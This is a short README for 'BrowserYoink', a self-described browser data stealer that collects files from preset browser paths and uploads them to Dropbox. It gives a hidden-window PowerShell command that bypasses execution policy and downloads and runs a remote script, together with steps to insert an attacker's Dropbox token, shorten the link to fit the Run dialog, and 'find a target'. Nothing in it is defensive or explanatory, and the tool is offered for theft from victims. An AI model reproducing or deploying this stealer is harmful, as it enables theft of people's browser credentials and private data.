# WIP documentation
# BrowserYoink
Its your standard data stealer from browsers. This one specifically loops through preset paths and files. Files are sent to dropbox.

## How to use it
```
powershell -w h -ep bypass $AccessToken='';irm <link> | iex
```
 1. Place your dropbox ``AccessToken`` inside ``$AccessToken=''``
 2. Replace ``<link>`` with a **SHORTENED** link to either snatch.ps1 or your own copy. If link is not shortened it will exceed the character limit of Run dialog box and not work
 3. Find a target and plug it in
